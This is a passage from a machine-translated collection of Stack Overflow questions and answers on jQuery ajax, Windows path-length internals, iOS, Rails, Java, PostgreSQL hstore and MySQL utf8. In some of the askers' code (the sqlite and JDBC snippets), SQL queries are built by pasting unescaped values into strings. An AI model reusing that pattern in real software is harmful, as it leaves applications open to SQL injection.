          success:function(){

               $(this).parent().slideUp('slow');

          }

     });

return false;

}); 
```

虽然这在成功之外有效：

```
$('.mylink').click(function(){

         $(this).parent().slideUp('slow');

}); 
```

如何`$(this).parent()`在 ajax 的成功部分中引用？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-07T02:56:39.567

看看这里：[http ://plnkr.co/edit/fAjLM8hS9BmdQ7tJ0UZA?p=preview](http://plnkr.co/edit/fAjLM8hS9BmdQ7tJ0UZA?p=preview)

基本上`this`不再指代相同的 HTML 元素，它实际上指的是成功函数中的窗口对象（一个简单[`console.log`](https://developer.mozilla.org/en-US/docs/DOM/console.log)的变量`this`有很大帮助！）。

要获得您想要的功能，请在 ajax 调用之外定义一个新变量：

```
$('.myLink').click(function() {
    var myLink = $(this);
    // wait 2 seconds to simulate an Ajax call somewhat
    setTimeout(function() {
      myLink.parent().slideUp('slow');
    }, 2000);
}); 
```

# windows - 当文件路径超过大约时内部会发生什么。Windows 中的 32767 个字符？

> ID：15262110
> 
> 赞同：32
> 
> 时间：2013-03-07T02:42:29.930
> 
> 标签：windows, winapi, internals

在 Windows（假设 2000 以后）中，文件路径的长度最多约为 32767 个字符。由于本机 API 中的内部处理[`UNICODE_STRING`](http://msdn.microsoft.com/en-us/library/windows/hardware/ff564879.aspx)（也在内核端、驱动程序等中），存在此限制。到现在为止还挺好。我知道那部分背后的理论。

限制的原因是`Length`和的`MaximumLength`成员`UNICODE_STRING`计算 中的字节数`Buffer`，但它们本身是 16 位无符号整数。

我也知道为什么限制是近似值而不是设定限制。这主要是由于您的文件名（例如`\\.\C:\boot.ini`）如何解析为其本机形式（例如`\??\C:\boot.ini`），然后解析为以*实际*卷设备名称为前缀的内容，然后是相对于该卷的路径，例如`\Device\HarddiskVolume2\boot.ini`.

此外，在 Windows 资源管理器中，达到（“ANSI”）`MAX_PATH`限制时的已知症状是假装文件或文件夹在某些版本的 Windows 中不存在（可能在某些时候得到修复）。

**但是，**当我`CreateFile()`使用看起来像的路径进行调用`\\.\C:\...\filename.ext`并且整个路径*没有*超过限制但*达到*限制时，分别在对象管理器、I/O 管理器和文件系统驱动程序级别会发生什么，在我对`kernel32.dll`'s 的调用中`CreateFile()`然后*得到*扩大？...

SDK 和 WDK 似乎都没有特别谈论这个话题。还是我看错了部分？

* * *

## 回答 #1

> 赞同：39
> 
> 时间：2013-03-12T22:49:10.237

因为我很懒，所以我没有编写测试程序，而是使用出色的[Far Manager](http://www.farmanager.com/)对其进行了测试，该管理器可以处理长路径（长于`MAX_PATH`）或特殊文件名（`con`等`prn`）。

我创建了一个正好 255 个字符的字符串（“12345678901234...012345”）并开始创建嵌套目录。幸运的是，Far 的“制作目录”函数采用斜杠分隔的字符串来表示“创建嵌套目录”，因此我只需几个步骤即可通过在内部编辑器中准备一个字符串并进行一些复制和粘贴来完成它。

我能够创建的最长路径是**32739 个**字符，从“C:\”开始计算（即不包括 Far 添加的“\\?\”）。尝试创建仅包含一个附加字符的目录或文件时出现的错误是“**文件名或扩展名太长。** ”。如果我尝试进入该目录，我会得到同样的错误。

**编辑**：在调试器中花了一些时间，这是在 Win32 API 级别上发生的事情：

1.  我尝试创建一个字符超过限制的文件
2.  `CreateFileW`使用字符串 "\\?\C:\123[...]012345" 进行远调用，该字符串长**32744 个**宽字符（不包括终止零）。
3.  `CreateFileW`做一些额外的检查，将 null 终止的字符串转换为`UNICODE_STRING`(Length=65488, MaximumLength=65490) 并准备一个`OBJECT_ATTRIBUTES`结构。
4.  `CreateFileW`然后调用[`NtCreateFile`](http://msdn.microsoft.com/en-us/library/bb432380)in `ntdll.dll`，这只是`syscall`指令的包装。
5.  `NtCreateFile`返回**0xC0000106** ( `STATUS_NAME_TOO_LONG`)。
6.  然后将该状态值转换（使用`RtlNtStatusToDosError`）为 Win32 错误 206 ( `ERROR_FILENAME_EXCED_RANGE`)。

~~我没有费心检查内核中发生了什么，但我想我也可以看看~~。

**EDIT2**：我运行[WinObj 并发](http://technet.microsoft.com/en-us/sysinternals/bb896657.aspx)现在我的系统`C:`上是一个指向`\Device\HarddiskVolume1`. 该字符串长度为**23 个字符**。如果我们用它替换`\C:`传递给的字符串中的`NtCreateFile`，我们得到 32744 - 3 + 23 = **32764 个**字符。与终止零一起，这需要 65530 个字节。仍然没有达到限制（0xFFFF=65535），所以我想还有一些额外的东西被添加了，比如会话或命名空间名称。

**EDIT3**：通过内核后：

1.  `NtCreateFile`来电`IopCreateFile`
2.  `IopCreateFile`来电`ObOpenObjectByName`
3.  `ObOpenObjectByName`来电`ObpLookupObjectName`
4.  `ObpLookupObjectName`检查`ObpDosDevicesShortNamePrefix`( `"\??\"`) -> 成功
5.  它跳过前缀并将剩余部分拆分为`"C:"`和`"\1234..."`
6.  它`"C:"`通过调用来解决`ObpLookupDirectoryEntry`
7.  然后它调用**`ObpParseSymbolicLink`**将查找的目录条目（`_OBJECT_SYMBOLIC_LINK`带有`LinkTarget`==`"\Device\HarddiskVolume1"`和`DosDeviceDriveIndex`== 3）和名称的其余部分传递给它。
8.  然后它会做这样的事情（由 ReactOS 忠实[复制](http://doxygen.reactos.org/da/d0a/ob_8h_ab927f63c0efdf3e4ba6142ec45d0aadf.html)）：

    ```
    TargetPath = &SymlinkObject->LinkTarget;
    TempLength = TargetPath->Length;
    TotalLength = TempLength + RemainingName->Length;
    if (LengthUsed > 0xFFF0)
        return STATUS_NAME_TOO_LONG; 
    ```

    在我们的例子中，46 + 65476 = 65522 (0xfff2) 刚好高于限制。

    所以在那里，谜团解开了（我希望！）。

PS 在 Windows 7 x64 SP1 下测试的所有内容。

# ajax - 循环通过一组数据库查询（mySQL/sqlite）时出现加载消息

> ID：15262113
> 
> 赞同：0
> 
> 时间：2013-03-07T02:42:42.553
> 
> 标签：ajax, asynchronous, callback

我希望在从 sqLite 的数据库中查询信息时显示加载消息。这是我到目前为止所拥有的：

```
 $.mobile.showPageLoadingMsg("a", "Updating Distributor List...", true);
    $.ajax({ 
        type: "POST",
        cache: false,
        url: "https:xxxx.php",
        data: { lastUpdated: lastUpdated, section: 'distributors'},
        dataType: "json",
        success: function(result){
                $.each(result.response, function(i, val) {
                    db.transaction(function(ctx) {
                        ctx.executeSql("SELECT ID FROM distributors WHERE token = '"+val.ID+"' ", [], function(tx,checkres) { //select all from phoneDB 
                            if(checkres.rows.length) {
                                    tx.executeSql("update distributors set distributorName='"+val.distributorName+"',address='"+val.address+"',postcode='"+val.postcode+"',phone='"+val.phone+"',email='"+val.email+"',lastUpdated='"+val.lastUpdated+"' WHERE token='"+val.ID+"'", []);
                            } else {
                                if(val.deleted != "1") {
                                    tx.executeSql("INSERT INTO distributors(distributorName,address,postcode,phone,email,lastUpdated,token) VALUES('"+val.distributorName+"','"+val.address+"','"+val.postcode+"','"+val.phone+"','"+val.email+"','"+val.lastUpdated+"','"+val.ID+"')", []);
                                }
                            }
                        });
                    });
                });     
            $.mobile.hidePageLoadingMsg();                      
        }
    }) 
```

所以这会触发一个 AJAX 查询，我最初的想法是在成功完成后显示加载消息并隐藏它。但是......在成功回调中是另一个本地数据库查询，最多需要 15 秒才能完成。这也是异步的，因此加载消息取决于等待这些查询完成。

此外，我有大约 3 或 4 个这些 ajax 查询都在做几乎相同的事情，所以加载消息会根据我们当前所在的 ajax 成功回调而改变。

希望这是有道理的。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T04:47:40.800

这是一个快速的想法。设置 4 个全局变量。将它们的值设置为 false。

一旦第一个外部查询完成，将第一个全局变量的值设置为 true 并调用将停止进度指示器的函数。

仅当所有全局变量都设置为 true 时，此函数才会停止进度指示器。

因此，当所有 4 个内部 ajax 调用完成时，此函数将停止您的进度指示器。

我希望你知道如何在 javascript 中设置全局变量

```
function someFunction(){
    this.firstIndicator=false;
    this.secondIndicator=false;
} 
```

然后你可以调用函数 someFunction.firstIndicator

# ios - 在xcode中解析两个JSON数据fom url，方法相同，第一个顺利，第二个不起作用

> ID：15262116
> 
> 赞同：0
> 
> 时间：2013-03-07T02:42:56.110
> 
> 标签：ios, xcode, json, parsing

我正在研究它几个小时，但找不到我的解析有什么问题。我正在从 url 解析 2 个文件，第一个（“Parks.json”）运行良好，没有任何问题，第二个（“shops.json”）运行不顺利。他们都建立了相同的。NSLog 上`parkParsing`显示所有数据，NSLog 上`shopParsing`显示无数据。有任何想法吗？

第一个：[http ://b7tour.idanmoshe.com/Parks.json](http://b7tour.idanmoshe.com/Parks.json)

第二个：[http ://b7tour.idanmoshe.com/shops.json](http://b7tour.idanmoshe.com/shops.json)

我的代码：

```
//
//  ThirdViewController.m
//  TabEx1
//
//  Created by הייפראקטיב היי-טק on 13/02/12.
//  Copyright (c) 2012 __MyCompanyName__. All rights reserved.
//

#import "ThirdViewController.h"

@interface ThirdViewController ()
{
    NSMutableData *jsonData;
    NSURLConnection *connection;
    NSMutableArray *listOfItems;
}
@end

@implementation ThirdViewController

- (id)initWithNibName:(NSString *)nibNameOrNil bundle:(NSBundle *)nibBundleOrNil
{
    self = [super initWithNibName:nibNameOrNil bundle:nibBundleOrNil];
    if (self) {
        // Custom initialization
        self.title = NSLocalizedString(@"מקומות", @"מקומות");
        self.tabBarItem.image = [UIImage imageNamed:@"places"];
    }
    return self;
}

#pragma mark - View lifecycle

- (void)viewDidLoad
{
    [super viewDidLoad];
    // Do any additional setup after loading the view from its nib.

    self.locLat = [[NSMutableDictionary alloc] init];
    self.locLong = [[NSMutableDictionary alloc] init];
    self.parkHebrew = [[NSMutableDictionary alloc] init];
    self.parkEnglish = [[NSMutableDictionary alloc] init];
    self.shopHebrew = [[NSMutableDictionary alloc] init];
    self.shopEnglish = [[NSMutableDictionary alloc] init];
    listOfItems = [[NSMutableArray alloc] init];

    switch (self.selectionIndex) {
        case 1:
            NSLog(@"parkParsing");
            [self parkParsing];
            break;
        case 2:
            NSLog(@"shopParsing");
            [self shopParsing];
            break;
        case 3:
            NSLog(@"Parking Lot");
            break;
        case 4:
            NSLog(@"Universities & Colleges");
            break;
        default:
            NSLog(@"self.selectionIndex = %i", self.selectionIndex);
            break;
    }
}

- (void) parkParsing
{
    [listOfItems removeAllObjects];
    NSURL *url = [NSURL URLWithString:@"http://b7tour.idanmoshe.com/Parks.json"];
    NSURLRequest *request = [NSURLRequest requestWithURL:url];
    connection = [NSURLConnection connectionWithRequest:request delegate:self];
    if (connection) {
        jsonData = [[NSMutableData alloc] init];
    }
}

- (void) shopParsing
{
    [listOfItems removeAllObjects];
    NSURL *url2 = [NSURL URLWithString:@"http://b7tour.idanmoshe.com/shops.json"];
    NSURLRequest *request2 = [NSURLRequest requestWithURL:url2];
    connection = [NSURLConnection connectionWithRequest:request2 delegate:nil];
    if (connection) {
        jsonData = [[NSMutableData alloc] init];
    }
}

-(NSInteger) numberOfSectionsInTableView:(UITableView *)tableView
{
    return 1;
}

-(NSInteger) tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section
{
    return [listOfItems count];
}

-(UITableViewCell*) tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath
{
    static NSString *CellIdentifier = @"Cell";
    UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:CellIdentifier];
    if (!cell) {
        cell = [[UITableViewCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:CellIdentifier];
    }
    cell.textLabel.text = [listOfItems objectAtIndex:indexPath.row];
    cell.textLabel.textAlignment = NSTextAlignmentRight;
    return cell;
}

-(void) connection:(NSURLConnection *)connection didReceiveResponse:(NSURLResponse *)response
{
    [jsonData setLength:0];
}

-(void) connection:(NSURLConnection *)connection didReceiveData:(NSData *)data
{
    [jsonData appendData:data];
}

-(void) connection:(NSURLConnection *)connection didFailWithError:(NSError *)error
{
    NSLog(@"Fail with error!");
}

-(void) connectionDidFinishLoading:(NSURLConnection *)connection
{
    NSDictionary *allDataDictionary = [NSJSONSerialization JSONObjectWithData:jsonData options:0 error:nil];

    NSDictionary *parks;
    NSDictionary *shops;
    NSArray *arrayOfParks;
    NSArray *arrayOfShops;

    switch (self.selectionIndex) {
        case 1:
            // Parks
            parks = [allDataDictionary objectForKey:@"Parks"];
            arrayOfParks = [parks objectForKey:@"Park"];

            for (NSDictionary *diction in arrayOfParks) {
                self.tempParkHebName = [diction objectForKey:@"hebName"];
                self.tempParkEngName = [diction objectForKey:@"engName"];
                self.latitude = [diction objectForKey:@"lat"];
                self.longtitude = [diction objectForKey:@"long"];

                NSLog(@"tempParkHebName = %@, tempParkEngName = %@", self.tempParkHebName, self.tempParkEngName);

                [self.locLat setObject:self.latitude forKey:self.tempParkHebName];
                [self.locLong setObject:self.longtitude forKey:self.tempParkHebName];
                [self.parkHebrew setObject:self.tempParkHebName forKey:self.tempParkHebName];
                [self.parkEnglish setObject:self.tempParkEngName forKey:self.tempParkHebName];

                [listOfItems addObject:self.tempParkHebName];
            }
            break;
        case 2:
            // Shopping Centers
            shops = [allDataDictionary objectForKey:@"Shops"];
            arrayOfShops = [shops objectForKey:@"Shop"];

            for (NSDictionary *diction in arrayOfShops) {
                self.tempShopHebName = [diction objectForKey:@"hebName"];
                self.tempShopEngName = [diction objectForKey:@"engName"];
                self.latitude = [diction objectForKey:@"lat"];
                self.longtitude = [diction objectForKey:@"long"];

                NSLog(@"tempShopHebName = %@, tempShopEngName = %@", self.tempShopHebName, self.tempShopEngName);

                [self.locLat setObject:self.latitude forKey:self.tempShopHebName];
                [self.locLong setObject:self.longtitude forKey:self.tempShopHebName];
                [self.shopHebrew setObject:self.tempShopHebName forKey:self.tempShopHebName];
                [self.shopEnglish setObject:self.tempShopEngName forKey:self.tempShopHebName];

                [listOfItems addObject:self.tempShopHebName];
            }
            break;
        case 3:
            // Parking Lot
            break;
        case 4:
            // Universities & Colleges
            break;
    }
    [[self itemsTableView] reloadData];
}

-(void)tableView:(UITableView*)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath
{
    [self.itemsTableView deselectRowAtIndexPath:indexPath animated:YES];

    NSString *details = [listOfItems objectAtIndex:indexPath.row];

    NSString *saveLatitude = [self.locLat objectForKey:details];
    NSString *saveLongtitude = [self.locLong objectForKey:details];
    NSString *saveHebName;
    NSString *saveEngName;

    switch (self.selectionIndex) {
        case 1:
            // Parks
            saveHebName = [self.parkHebrew objectForKey:details];
            saveEngName = [self.parkEnglish objectForKey:details];
            NSLog(@"saveHebName = %@, saveEngName = %@", saveHebName, saveEngName);
            break;
        case 2:
            // Shopping Centers
            saveHebName = [self.shopHebrew objectForKey:details];
            saveEngName = [self.shopEnglish objectForKey:details];
            NSLog(@"saveHebName = %@, saveEngName = %@", saveHebName, saveEngName);
            break;
        case 3:
            // Parking Lot
            break;
        case 4:
            // Universities & Colleges
            break;
    }

    FirstViewController *fvc = [[FirstViewController alloc] initWithNibName:@"FirstViewController" bundle:nil];
    SecondViewController *svc = [[SecondViewController alloc] initWithNibName:@"SecondViewController" bundle:nil];
    ThirdViewController *tvc = [[ThirdViewController alloc] initWithNibName:@"ThirdViewController" bundle:nil];
    ForthViewController *forth_vc = [[ForthViewController alloc] initWithNibName:@"ForthViewController" bundle:nil];

    fvc.userSelectedLatitude = saveLatitude;
    fvc.userSelectedLongitude = saveLongtitude;
    fvc.parkHebName = saveHebName;
    fvc.parkEngName = saveEngName;

    UITabBarController *tabControl = [[UITabBarController alloc] init];
    [tabControl setViewControllers:[NSArray arrayWithObjects:fvc, svc, tvc, forth_vc, nil]];
    [tabControl setModalTransitionStyle:UIModalTransitionStyleFlipHorizontal];
    [self presentModalViewController:tabControl animated:NO];
}
@end 
```

# ruby-on-rails - Rails 文本字段助手返回数组？

> ID：15262119
> 
> 赞同：0
> 
> 时间：2013-03-07T02:43:18.217
> 
> 标签：ruby-on-rails, ruby, ruby-on-rails-3

我有一个看起来像这样的 rails 表单助手：

```
<%= text_field :username,nil, {:placeholder=>"new username", :value=>nil} %> 
```

当我查看由此生成的 HTML 时，它看起来像：

```
input id="username_" name="username[]" placeholder="new username" size="30" type="text" 
```

（HTML <> 已删除）

这使得访问用户名属性很麻烦。我愿意：

```
@user.username = [:username] 
```

参数看起来像

```
{"utf8"=>"✓", "authenticity_token"=>"...", "username"=>["newusername"], "commit"=>"Save", "id"=>"10"} 
```

并且@user.username 被设置为（转义）[“newusername”] - 它被设置为“--- - newusername”

无法弄清楚如何摆脱表单值周围的 [] ！我该怎么办？

编辑：由 rails 生成的整个表单：http: [//tny.cz/0d5a9397](http://tny.cz/0d5a9397)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T03:02:46.057

你应该使用`text_field_tag`

```
<%= text_field_tag :username, nil, :placeholder => "new username" %> 
```

using`text_field`以某种方式期望您在资源上工作。

```
text_field :user, :username 
```

您仍然可以使用 text_field 但您必须明确设置名称

```
text_field :username, nil, name: 'username' 
```

我不知道的是，如果您`nil`作为第二个参数传递，它将将该字段设置为集体标签，因此我今天学到了一些新东西。

# ios - 为什么其他东西通过 Interface Builder xib 调用连接到 UIBarButtonItem 的方法？

> ID：15262121
> 
> 赞同：0
> 
> 时间：2013-03-07T02:43:32.667
> 
> 标签：ios, interface-builder, uibarbuttonitem, objective-c-category, unrecognized-selector

按下在 rightBarButtonItem 的自定义视图中找到的按钮时，我的 iOS 应用程序崩溃。使用自定义视图是因为 barButtonItem 设计需要的不仅仅是一个按钮。

这是崩溃的输出：

```
[UIViewControllerWrapperView buttonPressed:]: unrecognized selector sent to instance 0x7669430]
*** Terminating app due to uncaught exception 'NSInvalidArgumentException', reason: '-[UIViewControllerWrapperView buttonPressed:]: unrecognized selector sent to instance 0x7669430' 
```

自定义视图在单独的视图控制器的 xib 中定义，RightBarButtonItemVC 也包含此链接方法：

```
- (IBAction)buttonPressed:(id)sender {
    NSLog(@"button pressed");
} 
```

rightBarButtonItemVC 用于 viewDidLoad 中，用于所有需要该项目的视图控制器：

```
- (void)viewDidLoad
{
    [super viewDidLoad];

    RightBarButtonItemVC *rightBarButtonItemVC = [[RightBarButtonItemVC alloc] initWithNibName:@"RightBarButtonItemVC" bundle:nil];

    UIBarButtonItem *rightBarButtonItem = [[UIBarButtonItem alloc] initWithCustomView:rightBarButtonItemVC.view]; 

    self.navigationItem.rightBarButtonItem = rightBarButtonItem;
} 
```

请注意我如何将 rightBarButtonItemVC 的视图分配为 rightBarButtonItem 的视图。

# 问题

1.  为什么 UIViewControllerWrapperView 的实例调用我的选择器而不是我的 rightBarButtonItemVC 实例？
2.  我怎样才能防止这种情况发生并让按钮工作？我应该为 UIViewControllerWrapperView 写一个类别吗？如果是这样，在哪里导入文件？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T05:12:16.323

`UIViewControllerWrapperView`没有调用你的选择器；您的按钮正在调用`-buttonPressed:`. `UIViewControllerWrapperView`尝试[启用僵尸](https://stackoverflow.com/questions/2190227/how-do-i-set-up-nszombieenabled-in-xcode-4)。

看起来您`RightBarButtonItemVC`只是将其用作视图加载器（我假设您正在使用 ARC，否则它会泄漏）。`rightBarButtonItemVC.view = nil`这很昂贵，并且除非您在其他地方使用视图之前进行设置（我忘了具体是什么），否则可能会发生奇怪的事情。[我在这里](https://stackoverflow.com/questions/3524051/load-view-from-nib-file-from-several-different-uiviewcontrollers/3525335#3525335)提出了一种从 nib 加载视图的更好方法（我不知道 Interface Builder 是否支持协议拥有的 nib，这将是理想的）。

您的代码可能崩溃的主要原因有两个：

*   在NIB中，`-buttonPressed:`是接错了东西。我认为这不太可能。
*   `-buttonPressed:`将被发送到`RightBarButtonItemVC`，除了`RightBarButtonItemVC`没有被任何东西保留，因此它被释放。它被发送到在同一地址分配的下一个对象，该地址恰好是`UIViewControllerWrapperView`.

有两个简单的修复：

*   在 Interface Builder 中删除连接并使用[`-addTarget:action:forControlEvents:`](http://developer.apple.com/library/ios/documentation/UIKit/Reference/UIControl_Class/Reference/Reference.html#//apple_ref/occ/instm/UIControl/addTarget:action:forControlEvents:). 这需要在视图层次结构中找到按钮。
*   首先以编程方式创建它。

我更喜欢后者；从长远来看，在代码中维护 UI 似乎要容易*得多*，而且本地化也容易得多，因为您只需要翻译一个字符串文件。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-14T10:33:26.213

## 直接回答：

1.  正如@tc.的回答所建议的那样，在 xib 中定义视图和使用视图控制器 (RightBarButtonItemVC) 在 UIBarButtonItem 上定义自定义视图之间存在脱节，这在 UIViewControllerWrapperView 接收到 buttonPressed 的事实中很明显调用而不是 RightBarButtonItemVC。看起来有些东西没有被保留，尽管我不确定是什么。
2.  以下是我实施的具体工作解决方案。我确实做了一个类别，但不是为 UIViewControllerWrapperView 如前所述。

## 具体解决方案：

首先在 UIViewController 上创建一个 Objective-C 类别 BarButtonItemLoader：

```
@interface UIViewController (BarButtonItemLoader) 
```

在 UIViewController+BarButtonItemLoader.h 中，定义这个方法：

```
- (UIBarButtonItem *) rightBarButtonItem; 
```

由于您无法跟踪类别中的状态，因此在 AppDelegate.h 中定义一个 UIBarButtonItem：

```
@property (strong, nonatomic) UIBarButtonItem *rightBarButtonItem; 
```

接下来，通过从 AppDelegate 延迟加载 rightBarButtonItem 开始实现类别的 rightBarButtonItem 方法（不要忘记#import "AppDelegate.h"）。这确保了 AppDelegate 中只会创建和保留一个 rightBarButtonItem：

```
- (UIBarButtonItem *) rightBarButtonItem {

    AppDelegate *appDelegate = (AppDelegate *)[[UIApplication sharedApplication] delegate];

    if(!appDelegate.rightBarButtonItem) {
        //create a rightBarButtonItem (see below)
    }
    return appDelegate.rightBarButtonItem;
} 
```

开始组装将设置为 rightBarButtonItem 的 UIView/UIBarButtonItem。从旧的 Interface Builder / xib 实现中传输每个元素/配置。最重要的是记下大小检查器中的框架信息，这样您就可以通过编程方式定位子视图，就像您在 .xib 文件中手动定位它们一样。

```
- (UIBarButtonItem *) rightBarButtonItem {

    AppDelegate *appDelegate = (AppDelegate *)[[UIApplication sharedApplication] delegate];

    if(!appDelegate.rightBarButtonItem) {
        UIView *rightBarView = [[UIView alloc] initWithFrame:CGRectMake(0, 0, 264, 44)];
        UIBarButtonItem *rightBarButtonItem = [[UIBarButtonItem alloc] initWithCustomView:rightBarView];
        UIImageView *textHeader = [[UIImageView alloc] initWithImage:[UIImage imageNamed:@"textHeader.png"]];
        textHeader.frame = CGRectMake(2, 14, 114, 20);
        [rightBarView addSubview:textHeader];

        UIButton *button1 = [[UIButton alloc] initWithFrame:CGRectMake(100, 2, 70, 44)];
        [button1 setImage:[UIImage imageNamed:@"button1.png"] forState:UIControlStateNormal];
        [button1 setImage:[UIImage imageNamed:@"button1Highlighted.png"] forState:UIControlStateHighlighted];
        [button1 addTarget:self action:@selector(button1Pressed) forControlEvents:UIControlEventTouchUpInside];
        [rightBarView addSubview:button1];

        UIButton *button2 = [[UIButton alloc] initWithFrame:CGRectMake(194, 2, 70, 44)];
        [button2 setImage:[UIImage imageNamed:@"button2.png"] forState:UIControlStateNormal];
        [button2 setImage:[UIImage imageNamed:@"button2Highlighted.png"] forState:UIControlStateHighlighted];
        [button2 addTarget:self action:@selector(button2Pressed) forControlEvents:UIControlEventTouchUpInside];
        [rightBarView addSubview:button2];

        appDelegate.rightBarButtonItem = rightBarButtonItem;
    }
    return appDelegate.rightBarButtonItem;
} 
```

最后，根据您的目的实现 UIViewController+BarButtonItemLoader.m 中的 buttonXPressed 方法：

```
- (void) button1Pressed {
      NSLog(@"button1 Pressed");
}

- (void) button2Pressed {
      NSLog(@"button2 Pressed");
} 
```

...

通过将此代码添加到任何 UIViewController 或其子类来使用该类别：

```
#import "UIViewController+BarButtonItemLoader.h"

- (void)viewDidLoad {
    [super viewDidLoad];
    self.navigationItem.rightBarButtonItem = [self rightBarButtonItem];
} 
```

## 概括

这种方法允许您将 UIBarButtonItem 即时添加到任何 UIViewController。缺点是您必须将上述代码添加到您创建的所有 UIViewControllers 中。

## 另外的选择

如果您想进一步封装 UIBarButtonItems（或其他任何内容）的添加，避免在每个 View Controller 中添加代码，您应该创建一个 BaseViewController，然后您可以从中继承所有其他 View Controller。从那里您可以考虑要包含在所有视图控制器中的其他项目。那么选择类别或子类路径就变成了一个粒度问题。

# java - 在链表 sortedInsert 上需要帮助

> ID：15262122
> 
> 赞同：1
> 
> 时间：2013-03-07T02:43:37.347
> 
> 标签：java

这个问题要我为我的 LList 类编写一个方法，假设列表已经按排序顺序，它将在正确的位置添加一个新节点。我正在处理的列表是一个队列。

这是我的 LNode 类：

```
class LNode{
    private int val;
    private LNode next;
    private LNode prev;
    public LNode(int v, LNode n, LNode p){
        next = n;
        prev = p;
        val = v;
    }
    public int getVal(){
        return val;
    }
    public LNode getNext(){
        return next;
    }
    public LNode getPrev(){
        return prev;
    }
    public void setVal(int v){
        val = v;
    }
    public void setNext(LNode n){
        next = n;
    }
    public void setPrev(LNode p){
        prev = p;
    }
} 
```

这是我的 LTest 课程：

```
public class LTest{
    public static void main(String[]args){
        LList nums = new LList();
        nums.enqueue(55);
        nums.enqueue(20);
        nums.enqueue(13);
        nums.enqueue(11);
        nums.sortedInsert(15);

        nums.display();
    }
} 
```

这是我在 LList 类中尝试过的：

```
public void sortedInsert(int v){
    LNode tmp = head;
    while(v<tmp.getVal()){
        tmp = tmp.getNext();
    }
    tmp.setNext(tmp.getPrev().getNext());//tmp's next is now the original LNode
    tmp.getPrev().getNext().setPrev(tmp);//the original LNode's previous is now tmp
    tmp.getPrev().setNext(tmp);//tmp's previous LNode's next is now tmp
    tmp.setVal(v);
} 
```

它不起作用，输出是 55,20，然后是 15 永远和 java 崩溃。我猜这是因为 tmp LNode 指向它自己，但对我来说，我的代码并没有这样做。那么谁能告诉我怎么了？谢谢你。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-07T02:58:01.233

From my first look at your code it looks as though you do not actually create a new node for the new value v in the sortedInsert method. I think you will need to create a new node then itereate through your LinkedList then attach the new node and not really worry about setting the value of the data because it will be captured in the new node. Kind of something like this maybe...

```
LNode newnode = new LNode();
newnode.setVal(v);

LNode tmp = head;

while(v < head.getVal())
{
   //etc...
} 
```

Don't forget that if the new node is at the beginning you need to change your head variable to point to the newnode.

# postgresql - hstore 键上的唯一索引或约束

> ID：15262132
> 
> 赞同：8
> 
> 时间：2013-03-07T02:44:43.427
> 
> 标签：postgresql, hstore

如果该键存在，我想在 hstore 列中的特定键上创建唯一索引或约束。我希望答案能在另一个问题的某个地方找到：

[PostgreSQL 中表达式索引的实际限制](https://stackoverflow.com/questions/6264530/practical-limitations-of-expression-indexes-in-postgresql)

但是我尝试了我能想到的每个版本的语法，但没有任何效果。

目前，我的桌子是

hstore_table

hstore 字段是 hstore_value

当它们存在时，我想强制它们唯一的键是“foo”和“bar”。

我的 PostgreSQL 版本是 8.4.13

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2013-03-07T03:06:43.980

如果我正确理解了您的要求，那么您需要一个部分唯一的功能索引：

```
CREATE TABLE hstest ( x hstore not null );

CREATE UNIQUE INDEX hstest_key_k1_values_unique 
ON hstest((x -> 'k1'))
WHERE ( x ? 'k1' ); 
```

该`WHERE`子句不是严格要求的，因为如果找不到，则键查找将为空。是否合适将取决于您的查询。

如果您想要多个键，如果您希望两个索引是独立的，则使用两个索引，或者如果您想链接两个表达式，则使用两个索引，以便唯一约束允许 (1,2) 和 (1,3) 或 (2,2)但不是另一个（1,2），像这样：

```
CREATE UNIQUE INDEX hstest_key_k1k2_values_unique 
ON hstest ((x -> 'k1'), (x -> 'k2')); 
```

# java - 如何通过 jdbc 将 utf8 存储到 mysql 5.X

> ID：15262133
> 
> 赞同：1
> 
> 时间：2013-03-07T02:44:47.347
> 
> 标签：java, mysql, jdbc, utf-8

我正在尝试将数据存储到 mysql，此处显示了其中的摘录：

```
"description":"★배달 사고 혹은 장난주문 방지주 찾는 배달음식점 즐겨찾기\n지난 주문 내역 확인\n포인트 적립 및 결제\n소셜 네트워크 연동을 통한 평가 남기기\n철가방에서 제공하는 다양한 이벤트", "currency":"USD", "genres":["Food & Drink", "Lifestyle"], "genreIds":["6023", "6012"], "releaseDate":"2011-10-10T07:00:00Z", "sellerName":"sang yoon woo", "bundleId":"kr.co.helloworld.hellodelive/us/app/cheolgabang/id468583150?mt=8&uo=4", "trackContentRating":"4+", "averageUserRating":5.0, "userRatingCount":2}, 
```

{“种类”：“软件”，“功能”：[“iosUniversal”]，“支持的设备”：[“所有”]，“

它似乎是utf8。我尝试在所有适当的地方设置utf8，但未能成功保存到mysql。

在 5.1 和 5.5 mysql 数据库上，通过使用连接器/J 的 jdbc 观察到以下行为。

这是我尝试过的事情：（a）只使用默认值。不起作用，ascii 字符很好，但 CJK 字符不行。

(b) 在任何地方设置 utf8：在连接中，在表中，在连接和客户端中。没有更改/不成功正确存储 utf8 字符（它们显示为？等）。回答 jim 的问题： 使用 mysql 提示符直接在 mysql 服务器上检查数据，字符编码为 utf8。

```
 DB.execute(conn, "SET character_set_results = 'utf8', character_set_client = 'utf8', character_set_connection = 'utf8', character_set_database = 'utf8', character_set_server = 'utf8'",false);
  DB.execute(conn,"drop table if exists dummy1; ",false);
  DB.execute(conn,"create table dummy1 (id int auto_increment primary key, contents blob) default charset='latin1';",false);
String insert = String.format("insert into dummy1 (contents) values ('%s');", escapedContents);
    DB.DBResult result = DB.execute(conn, insert, true); 
```

然后我尝试添加连接参数如下：

```
jdbc:mysql://localhost:3306/classint?useUnicode=true&characterEncoding=utf8 
```

但出现以下错误：

```
useUnicode=true&characterEncoding=utf8" as stephenb: Unsupported character encoding 'utf8"'. 
```

（编辑说明：这个不支持编码的错误是由于 jdbc url 末尾的双引号引起的：删除它后 - 如上面的当前版本所示，这个特定错误消失了。但多字节字符的整体问题在数据库中出现乱码仍然存在）

